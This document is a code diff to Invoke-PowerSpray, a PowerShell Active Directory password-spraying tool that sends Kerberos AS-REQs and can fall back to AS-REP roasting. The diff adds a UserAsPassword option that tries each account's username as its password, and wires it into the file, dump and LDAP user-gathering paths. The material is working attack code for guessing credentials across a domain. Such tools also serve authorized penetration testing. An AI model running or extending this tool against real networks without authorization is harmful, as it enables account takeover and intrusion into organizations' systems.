@@ -18,6 +18,9 @@ Function Invoke-PowerSpray {
 .PARAMETER UserFile
     Specifies a file containing a list of usernames to send the AS-REQ for.
 
+.PARAMETER UserAsPassword
+    Specifies username as password for each authentication attempt.
+
 .PARAMETER Password
     Specifies the password for authentication attempts.
 
@@ -93,9 +96,23 @@ Function Invoke-PowerSpray {
         [String]
         $UserFile,
 
+        [Switch]
+        $UserAsPassword,
+
+        [String]
+        $Password,
+
+        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
+        [String]
+        $Hash,
+
         [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $DumpFile,
+
+        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
+        [String]
+        $EncType = 'AES256',
 
         [ValidateNotNullOrEmpty()]
         [String]
@@ -114,17 +131,6 @@ Function Invoke-PowerSpray {
 
         [Int]
         $LockoutThreshold,
-
-        [String]
-        $Password,
-
-        [ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})]
-        [String]
-        $Hash,
-
-        [ValidateSet('RC4', 'AES256', 'AES128', 'DES')]
-        [string]
-        $EncType = 'AES256',
 
         [UInt32]
         $Delay = 0,
@@ -223,6 +229,10 @@ Function Invoke-PowerSpray {
                 Write-Error "$($username)@$($domain) does not exist" -ErrorAction Stop
             }
         }
+        if ($UserAsPassword) {
+            $pass = $Username
+            $nthash = $null
+        }
         $cred = [pscustomobject] @{Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
     }
@@ -239,6 +249,10 @@ Function Invoke-PowerSpray {
                 }
             }
             if ($user -or -not $Ldap) {
+                if ($UserAsPassword) {
+                    $pass = $username
+                    $nthash = $null
+                }
                 $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
@@ -264,6 +278,10 @@ Function Invoke-PowerSpray {
                 }
                 if ($user -or -not $Ldap) {
                     $nthash = $dump[3]
+                    if ($UserAsPassword) {
+                        $pass = $user.samAccountName
+                        $nthash = $null
+                    }
                     $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
@@ -276,7 +294,7 @@ Function Invoke-PowerSpray {
         foreach($userAccountControl in $disabledUserAccountControl) {
             $filter += "(!userAccountControl:1.2.840.113556.1.4.803:=$userAccountControl)"
         }
-        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash'))) {
+        if (-not ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $UserAsPassword)) {
             # Find all enabled users without kerberos preauthentication enabled (AS-REP roasting)
             $filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)$filter)"
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
@@ -290,6 +308,10 @@ Function Invoke-PowerSpray {
             $users = Get-LdapObject -ADSpath $adsPath -Filter $filter -Properties $properties -Credential $LdapCredential
         }
         foreach ($user in $users) {
+            if ($UserAsPassword) {
+                $pass = $user.samAccountName
+                $nthash = $null
+            }
             $cred = [pscustomobject] @{Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
         }
